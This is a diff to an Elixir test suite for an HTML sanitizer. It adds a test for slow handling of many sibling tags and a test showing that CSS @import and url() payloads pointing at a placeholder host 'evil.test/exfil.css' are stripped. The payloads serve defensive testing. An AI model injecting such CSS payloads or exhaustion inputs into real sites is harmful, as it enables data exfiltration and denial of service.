@@ -352,4 +352,30 @@ defmodule HtmlSanitizeExScrubberHTML5Test do
     assert ratio < 10,
            "sanitizing the second string should not be an order of magnitude slower (was #{floor(ratio)}x)"
   end
+
+  test "traversal exhaustion" do
+    baseline_siblings = 2_000
+    attack_siblings = 20_000
+
+    benign = String.duplicate("<b>a</b>", baseline_siblings)
+    attack = String.duplicate("<b>a</b>", attack_siblings)
+
+    {time_benign, _clean_benign} = :timer.tc(fn -> sanitize(benign) end)
+    {time_attack, _clean_attack} = :timer.tc(fn -> sanitize(attack) end)
+
+    ratio = time_attack / max(time_benign, 1)
+
+    assert ratio < 20,
+           "sanitizing the second string should not be an order of magnitude slower (was #{floor(ratio)}x)"
+  end
+
+  test "input that isn't a `property: value` declaration is NOT returned verbatim" do
+    attacker_url = "//evil.test/exfil.css"
+
+    control = ~s|<style>.comment { background: url(#{attacker_url}) }</style>|
+    attack = ~s|<style>@import url(#{attacker_url});</style>|
+
+    refute String.contains?(sanitize(attack), "@import url(#{attacker_url});")
+    refute String.contains?(sanitize(control), "evil.test")
+  end
 end
